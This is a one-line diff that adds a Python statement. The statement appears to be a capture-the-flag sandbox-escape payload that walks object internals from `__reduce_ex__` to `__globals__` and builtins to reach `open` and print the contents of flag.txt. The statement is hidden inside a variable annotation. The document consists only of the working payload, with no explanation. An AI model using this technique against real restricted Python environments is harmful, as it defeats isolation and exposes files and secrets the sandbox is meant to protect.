@@ -1,0 +1,1 @@
+x: print([].__reduce_ex__(3)[0].__globals__["__builtins__"]["open"]('flag.txt').read()) = 0
